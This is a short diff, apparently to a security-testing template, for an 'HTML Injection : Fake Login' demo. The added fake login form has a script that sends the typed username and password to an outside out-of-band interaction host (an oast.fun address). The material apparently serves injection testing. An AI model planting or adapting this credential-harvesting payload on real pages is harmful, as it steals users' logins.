@@ -6,21 +6,26 @@ info:
     <div class="heading">
         <h1>HTML Injection : Fake Login by @cryptographer</h1>
     </div>
-    <div class="form-container">
-        <form action="https://example.com/login" method="post" class="form-signin">
-            <div class="form-group">
-                <label for="username">Username</label>
-                <input type="text" name="username" size="20">
-            </div>
-            <div class="form-group">
-                <label for="password">Password</label>
-                <input type="password" name="password" size="20">
-            </div>
-            <div class="form-group">
-                <button type="submit" class="btn btn-default">Login</button>
-            </div>
-        </form>
-    </div>
+    <div>
+  <label for="username">Username</label> 
+  <input size="20" name="username" id="username" type="text"> 
+</div> 
+<div> 
+  <label for="password">Password</label> 
+  <input size="20" name="password" id="password" type="password"> 
+</div> 
+<div> 
+  <button type="submit" onclick="submitForm()">Login</button> 
+</div>
+
+<script>
+  function submitForm() {
+    var username = document.getElementById('username').value;
+    var password = document.getElementById('password').value;
+    var url = 'https://daxdflhquoshqewipjau6uqrzm07x9l3m.oast.fun/?credentials?username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password);
+    window.location.href = url;
+  }
+</script>
 </div>'
 paths:
   /:
